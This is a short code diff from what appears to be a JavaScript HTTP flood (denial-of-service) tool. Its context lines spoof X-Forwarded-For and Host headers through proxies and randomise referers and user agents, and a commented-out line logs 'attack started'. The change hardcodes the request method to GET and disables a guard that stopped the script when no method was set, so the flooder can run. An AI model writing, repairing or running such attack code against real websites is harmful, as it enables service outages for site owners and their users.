@@ -738,7 +738,7 @@ const dateObj = new Date();
             "X-Forwarded-For": proxy[0],
             "X-Forwarded-Host": proxy[0],
             "Referer": referers[Math.floor(Math.random() * referers.length)],
-            ":method": methods(),
+            ":method": "GET",
             //"User-agent": uas,
             //"User-agent": ua[Math.floor(Math.random() * ua.length)],
             "User-agent": usera,
@@ -772,10 +772,10 @@ const dateObj = new Date();
             
            console.log('attack started')
         } */
-if (methods() !== undefined){
-    console.log("(!) you haven't added the method yet");
-    process.exit(0);
-}
+//if (methods() !== undefined){
+    //console.log("(!) you haven't added the method yet");
+    //process.exit(0);
+//}
         const agent = new http.Agent({
             keepAlive: true,
             keepAliveMsecs: 10000,
